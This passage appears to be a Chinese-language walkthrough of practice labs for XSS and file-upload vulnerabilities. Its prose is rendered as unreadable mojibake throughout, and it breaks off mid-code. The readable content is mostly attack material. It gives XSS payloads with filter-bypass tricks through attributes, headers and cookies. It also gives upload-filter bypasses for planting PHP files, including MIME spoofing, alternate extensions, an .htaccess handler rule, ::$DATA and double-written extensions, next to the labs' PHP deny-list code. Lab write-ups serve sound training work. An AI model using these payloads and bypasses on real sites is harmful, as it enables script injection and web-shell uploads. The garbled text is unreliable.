&quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;&gt; ä½†æ˜¯éƒ½ä¸è¡Œäº†ï¼Œå°è¯•äº†çœ‹æ ·å­æ˜¯è¿‡äº†href, onclick, scriptå…³é”®è¯ï¼Œå°è¯•å¤§å°å†™ç»•è¿‡ æäº¤ &quot;oNclick=&#x27;javascript:alert(1)&#x27; 7æäº¤&quot;oNclick=&#39;javascript:alert(1)&#39;,ä½†æ˜¯å‘ç°onè¢«è¿‡æ»¤äº† ç›´æ¥å°è¯•åŒå†™ç»•è¿‡ oonnclick=&#x27;javascript:alert(1) 8æäº¤&quot;oNclick=&#39;javascript:alert(1)ï¼Œå¯ä»¥å‘ç°è¿‡æ»¤äº† &quot; &lt; &gt;ï¼Œè€Œä¸”è¿›è¡Œäº†å®ä½“è½¬æ¢ æ¢ä¸€ç§æ–°çš„æ³¨å…¥æ–¹æ³•htmlå­—ç¬¦è½¬æ¢ç»•è¿‡ java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) 9å°è¯•ç¬¬å…«å…³ä½¿ç”¨çš„ä»£ç ä½†æ˜¯å‘ç°ä¸è¡Œ ä½†æ˜¯æŸ¥çœ‹æºç å¯ä»¥å‘ç°æç¤ºä½ çš„é“¾æ¥ä¸åˆæ³•ï¼Œé‚£ä¹ˆåˆæ³•çš„é“¾æ¥æœ‰ä»€ä¹ˆç‰¹ç‚¹å‘¢ å°±æ˜¯å¸¦æœ‰åè®®å¤´ java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) // http:// 10å°è¯•äº†å‡ ç§æ–¹æ³•ä¹‹åå‘ç° ,æ²¡æœ‰è¾“å‡ºç‚¹ å¯ä»¥å‘ç°è¾“å…¥ç‚¹æ˜¯éšè—çš„ ä½¿ç”¨ä¸‹é¢ä»£ç æµ‹è¯•ä»¥ä¸Šä¸‰ä¸ªå“ªä¸ªæ˜¯å¯ä»¥æ³¨å…¥çš„ &amp;t_link=&quot; text&quot; &amp;t_history=&quot;text&quot;&amp;t_sort=&quot;text&quot; å†æ„é€ ä»£ç  &amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1) 11è¿›å…¥é¡µé¢åå°è¯•ä½¿ç”¨ä¸Šä¸€å…³çš„æ–¹æ³•ä½†æ˜¯æ— æ•ˆï¼Œä¸Šç½‘æŸ¥çœ‹åå‘ç°æ˜¯å†refereå¤´æ³¨å…¥ å¯ä»¥å‘ç°ç›¸åº”åŒ…ä¸­å·²ç»è¢«æ³¨å…¥äº†XSS åœ¨æŠ“åŒ…é¡µé¢è¿”å›ç»™æµè§ˆå™¨ï¼Œå°±ä¼šå‡ºç°è¢«æ³¨å…¥çš„è¾“å…¥æ¡† 12ç»§ç»­æŠ“åŒ…ï¼Œè¿™æ¬¡å¯ä»¥å‘ç°æ˜¯åœ¨UAä¸­æ³¨å…¥ ä¸ä¸Šä¸€å…³åšæ³•ç›¸ä¼¼ å‡ºç°è¾“å…¥æ¡†ç‚¹å‡»å³å¯ 13è¿™å…³æ˜¯åœ¨cookieå¤„æ³¨å…¥ï¼Œæ–¹æ³•ä¸ä¹‹å‰ç›¸åŒ payload cookie: åŸå€¼+user=&quot; type=text onclick=&quot;alert(1) 14éœ€è¦ä½¿ç”¨å¸¦XSSçš„å›¾ç‰‡ 15ç›´æ¥æŸ¥çœ‹æºç  è¿™é‡Œç”¨äº†angularjsçš„ng-includeï¼Œç›´æ¥åœ¨åŒ…å«çš„é¡µé¢é‡Œç”¨&lt;script&gt;è§¦å‘ä¸äº†ï¼Œç”¨äº†imgæ ‡ç­¾ AngularJS ng-include æŒ‡ä»¤ ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚ åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ &lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt; éµå¾ªSOPï¼Œåªå¥½è°ƒç”¨ç¬¬ä¸€å…³ä»£ç ã€‚ éœ€è¦å•å¼•å·åŒ…è£¹ï¼Œå¦åˆ™å˜æˆæ³¨é‡Šã€‚ paloadï¼š /level15.php?src=&#x27;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&#x27; 16æµ‹è¯•å‘ç°è¿‡æ»¤ç©ºæ ¼ï¼Œscriptï¼Œ/ï¼Œæ‰€ä»¥ä½¿ç”¨%0d %0aåšåˆ†å‰²ç¬¦ç»•è¿‡è¿‡æ»¤ payload &lt;img%0Asrc=x%0Aonerror=alert(a)&gt; &lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt; 17æŸ¥çœ‹æºç æ‰¾åˆ°æ³¨å…¥ä½ç½® ä½†æ˜¯è¿™é‡Œè¿‡æ»¤&lt;, &gt;ï¼Œä½¿ç”¨äº‹ä»¶è§¦å‘å¼¹çª— Payloadï¼š ?arg01=&amp;arg02= onmouseover=alert(1) æ–‡ä»¶ä¸Šä¼ ç¯å¢ƒä½¿ç”¨phpstudyå¾ˆå®¹æ˜“æ­å»º pass1ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯ pass2æŸ¥çœ‹æºç  if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡ æŠ“åŒ…ä¿®æ”¹MIMEå³å¯ çŸ¥è¯†ç‚¹è¡¥å……ï¼š MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚ text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡ pass4.htaccessæ–‡ä»¶çš„ä½œç”¨ URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ MIMEç±»å‹é…ç½® è®¿é—®æƒé™æ§åˆ¶ç­‰ ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ å›¾ç‰‡é˜²ç›—é“¾ è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ ç›®å½•æµè§ˆä¸ä¸»é¡µ ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ æ–‡ä»¶å¯†ç ä¿æŠ¤ &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª 1.jpgå³å¯ pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜ pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç  $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º.pHp , .PHPç­‰ pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ1.php .ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª.ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³• $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç  $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ å°†æ–‡ä»¶åæ”¹ä¸º 1.php::$DATA,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯.ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º1.php. . ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº† pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç° deny_extçš„åç¼€åæ›¿æ¢ä¸ºç©º å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = 